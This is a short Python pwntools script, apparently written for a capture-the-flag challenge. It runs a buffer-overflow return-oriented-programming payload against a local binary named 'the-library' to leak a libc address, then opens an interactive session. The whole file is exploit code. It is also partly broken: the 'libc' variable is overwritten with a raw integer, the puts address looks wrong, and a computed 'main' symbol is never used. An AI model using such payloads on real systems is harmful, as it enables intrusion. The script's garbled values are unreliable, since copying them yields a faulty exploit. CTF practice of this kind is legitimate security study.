from pwn import *
import struct
p = process("./the-library")
binary = ELF('./the-library')
libc = ELF('./libc.so.6')
JUNK = "A" * 23
main = binary.symbols['main']
libc = 0x602018
plt_puts = 0x6002000
pop_rdi = 0x400733
print(libc)
payload = JUNK
payload += p64(pop_rdi)
payload += p64(libc)
payload += p64(plt_puts)

print(p.recvline())
p.sendline(payload)
p.interactive()